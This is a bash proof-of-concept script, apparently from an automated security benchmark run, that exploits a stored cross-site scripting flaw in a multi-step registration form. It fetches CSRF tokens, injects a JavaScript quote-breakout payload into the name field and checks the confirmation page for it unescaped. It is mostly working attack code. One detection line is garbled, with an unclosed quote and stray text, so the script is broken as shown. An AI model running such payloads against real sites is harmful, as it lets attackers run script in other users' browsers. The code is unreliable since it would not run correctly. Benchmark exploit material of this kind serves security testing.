#!/bin/bash
# POC: Stored XSS in registration name field - simplified POC with proper step navigation
# Target: ./repo
# Created: 2025-12-02T16:18:15.248Z
# Session: benchmark-XBEN-056-24-miorxlcr

# Stored XSS in Registration Name Field - POC v4
# Simplified version with proper step navigation

TARGET_URL="${1:-http://localhost:8000}"
REGISTER_STEP1="${TARGET_URL}/accounts/register/step1/"
REGISTER_STEP2="${TARGET_URL}/accounts/register/step2/"
REGISTER_STEP3="${TARGET_URL}/accounts/register/step3/"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}[*] Stored XSS in Registration Name Field POC v4${NC}"
echo -e "${YELLOW}[*] Target: ${TARGET_URL}${NC}\n"

# Step 1: Get the registration form and extract CSRF token
echo -e "${YELLOW}[*] Step 1: Fetching registration form${NC}"
FORM_RESPONSE=$(curl -s -c /tmp/cookies.txt "${REGISTER_STEP1}")

# Simple CSRF token extraction
CSRF_TOKEN=$(echo "$FORM_RESPONSE" | grep 'csrfmiddlewaretoken' | head -1 | grep -o 'value="[^"]*"' | cut -d'"' -f2)

echo -e "${YELLOW}[*] CSRF Token: ${CSRF_TOKEN:0:20}...${NC}\n"

# Step 2: Submit registration step 1 with XSS payload
MALICIOUS_NAME='"; alert("XSS Stored in Name"); //'
echo -e "${YELLOW}[*] Step 2: Submitting registration step 1 with XSS payload${NC}"
echo -e "${YELLOW}[*] Payload: ${MALICIOUS_NAME}${NC}\n"

STEP1_RESPONSE=$(curl -s -L -b /tmp/cookies.txt -c /tmp/cookies.txt \
  -X POST "${REGISTER_STEP1}" \
  -H "X-CSRFToken: ${CSRF_TOKEN}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "csrfmiddlewaretoken=${CSRF_TOKEN}&name=${MALICIOUS_NAME}&password=TestPass1234")

echo -e "${YELLOW}[*] Step 1 Response (first 50 lines):${NC}"
echo "$STEP1_RESPONSE" | head -50

# Step 3: Submit step 2 if needed
echo -e "\n${YELLOW}[*] Step 3: Submitting registration step 2${NC}"

# Try to extract CSRF from step 1 response for step 2
CSRF_TOKEN_2=$(echo "$STEP1_RESPONSE" | grep 'csrfmiddlewaretoken' | head -1 | grep -o 'value="[^"]*"' | cut -d'"' -f2)

if [ -z "$CSRF_TOKEN_2" ]; then
    CSRF_TOKEN_2="$CSRF_TOKEN"
fi

STEP2_RESPONSE=$(curl -s -L -b /tmp/cookies.txt -c /tmp/cookies.txt \
  -X POST "${REGISTER_STEP2}" \
  -H "X-CSRFToken: ${CSRF_TOKEN_2}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "csrfmiddlewaretoken=${CSRF_TOKEN_2}&email=test@example.com")

echo -e "${YELLOW}[*] Step 2 Response (first 50 lines):${NC}"
echo "$STEP2_RESPONSE" | head -50

# Step 4: Get step 3 to see the stored XSS
echo -e "\n${YELLOW}[*] Step 4: Fetching step 3 (confirmation page)${NC}"

STEP3_RESPONSE=$(curl -s -L -b /tmp/cookies.txt "${REGISTER_STEP3}")

echo -e "${YELLOW}[*] Step 3 Full Response:${NC}"
echo "$STEP3_RESPONSE"

# Analyze response for XSS
echo -e "\n${YELLOW}[*] Checking for XSS vulnerability...${NC}"

# Check for various XSS indicators
if echo "$STEP3_RESPONSE" | grep -q 'alert.*XSS'; then
    echo -e "${RED}[+] VULNERABILITY CONFIRMED: XSS payload found in response!${NC}"
    exit 0
fi

if echo "$STEP3_RESPONSE" | grep -q '"); alert'; then
    echo -e "${RED}[+] VULNERABILITY CONFIRMED: Quote breakout detected!${NC}"
    exit 0
fi

if echo "$STEP3_RESPONSE" | grep -q 'Just Now up to 50%; then
    echo -e "${YELLOW}[*] Found alert pattern in response${NC}"
    if echo "$STEP3_RESPONSE" | grep -q 'XSS Stored'; then
        echo -e "${RED}[+] VULNERABILITY CONFIRMED: Unescaped XSS found!${NC}"
        exit 0
    fi
fi

# Check if malicious payload appears anywhere
if echo "$STEP3_RESPONSE" | grep -F 'alert("XSS' >/dev/null 2>&1; then
    echo -e "${RED}[+] VULNERABILITY CONFIRMED: JavaScript alert with XSS found!${NC}"
    exit 0
fi

echo -e "${YELLOW}[-] Could not confirm XSS in response${NC}"
echo -e "${YELLOW}[-] Response may be empty or endpoint structure differs${NC}"
exit 1